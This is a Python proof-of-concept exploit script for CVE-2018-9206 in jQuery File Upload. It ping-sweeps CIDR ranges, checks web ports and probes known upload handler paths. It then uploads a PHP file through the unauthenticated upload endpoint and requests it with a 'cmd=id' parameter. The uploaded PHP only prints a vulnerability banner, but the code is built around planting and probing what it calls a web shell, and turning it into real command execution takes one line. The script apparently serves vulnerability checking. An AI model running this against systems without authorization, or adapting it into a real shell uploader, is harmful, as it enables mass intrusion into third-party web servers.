#!/usr/bin/env python3
import os
import requests
import socket
from netaddr import IPNetwork
from argparse import ArgumentParser

DEFAULT_USER_AGENT = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) \
    AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.101 Safari/537.36"

PATHS = [
    "{prefix}/server/php/upload.class.php",
    "{prefix}/example/upload.php",
    "{prefix}/server/php/UploadHandler.php",
    "{prefix}/php/index.php"
]

OUTPUTS = [
    "{prefix}/example/files/nopsec.php",
    "{prefix}/php/files/nopsec.php",
    "{prefix}/server/node-express/public/files/nopsec.php",
    "{prefix}/server/node/public/files/nopsec.php",
    "{prefix}/server/php/files/nopsec.php"
]

SHELL_CONTENT = "<?php echo 'Vulnerable to CVE-2018-9206: ' . date('Y-m-d h:i:sa'); ?>"

PORTS = {80 : 'http', 8000 : 'http', 8080 : 'http', 443 : 'https', 8443 : 'https'}

devnull = open(os.devnull, 'w')

from multiprocessing.pool import ThreadPool
pool = ThreadPool(processes=20)

def ping(host):
    """
    Returns True if host responds to a ping request
    """
    import subprocess, platform

    # Ping parameters as function of OS
    ping_str = "-n 1" if  platform.system().lower()=="windows" else "-c 1 -t 1"
    args = "ping " + " " + ping_str + " " + host
    need_sh = False if  platform.system().lower()=="windows" else True

    # Ping
    if subprocess.call(args, shell=need_sh, stdout=devnull, stderr=devnull) == 0:
        return host

def is_port_open(host, port):
    try: 
        result = 1
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(1)
        result = sock.connect_ex((host, port))
        if result == 0:
            sock.close()
            return True 
    except Exception as e:
        return False

def get_protocols(hosts):
    tmp = {}
    for host in hosts:
        if ':' in host:
            ip, port = host.split(':')
            if is_port_open(ip, int(port)):
                tmp[host] = PORTS[int(port)] 
        else:
            for port in PORTS.keys():
                if is_port_open(host, port):
                    tmp['{}:{}'.format(host, port)] = PORTS[port]
    return tmp

def parse_args():
    parser = ArgumentParser(description='CVE-2018-9206 PoC, initial release by Den1al, enhanced by NopSec')
    parser.add_argument('host', help='the host to check, host:port, or CIDR range')
    parser.add_argument('-p', '--prefix', help='The prefix for the path', default='jQuery-File-Upload-9.22.0')
    parser.add_argument('-u', '--user-agent', help='The user agent to send the requests with', default=DEFAULT_USER_AGENT)

    return parser.parse_args()


args = parse_args()

def is_cidr(host):
    if host.find('/') > 0:
        return True
    else:
        return False

def safe_concat(host, path, prot):
    host = host[:-1] if host.endswith('/') else host
    path = path[1:] if path.startswith('/') else path

    return '{}://{}/{}'.format(prot, host, path)


def is_path_available(url):
    try: 
        r = requests.head(url, headers={
            'User-Agent': args.user_agent
        })
        return r.status_code == 200
    except Exception as e:
        return False


def send_web_shell(url):
    print(f'[!] Sending PHP test script...')
    url = f'{url[:url.rfind("/")+1]}/index.php'
    try:
        r = requests.post(url, files={
            'files[]' : ('nopsec.php', SHELL_CONTENT),},
        headers={
            'User-Agent': args.user_agent
        })
    except Exception as e:
        pass 
 
def probe_web_shell(host, protocol):

    for path in OUTPUTS:
        formatted_path = path.format(prefix=args.prefix)
        url = safe_concat(host, formatted_path, protocol)
        try:
            r = requests.get(url, params={
                'cmd': 'id'
            }, headers={
                'User-Agent': args.user_agent
            })
            if r.status_code == 200:
                print(f'[+] {r.text}')
                break
        except Exception as e:
            pass

def handle_success(host, path, url):
    send_web_shell(url)
    probe_web_shell(host, url.split(':')[0])

def get_ip_range(host):
    tmp = []
    for ip in IPNetwork(host):
        tmp.append('%s' % ip)
    return tmp

def main():
    print(f'[!] Starting the scan for {args.host} ...')
    hosts = []
    host = args.host
    if ':' in host:
        hosts.append(host)
    else:
        if is_cidr(host):
            print('[!] Probing for live hosts...be patient')
            hosts = [ ip for ip in pool.map(ping, get_ip_range(host)) if ip ]
        else:
            hosts.append(host)
    
    host_w_prot = get_protocols(hosts) 
    for host in host_w_prot.keys():
        for path in PATHS:
            url = safe_concat(host, path.format(prefix=args.prefix), host_w_prot[host])
            if is_path_available(url):
                print(f'[!] Testing {url} ...')
                handle_success(host, path, url)
                break

if __name__ == '__main__':
    main()
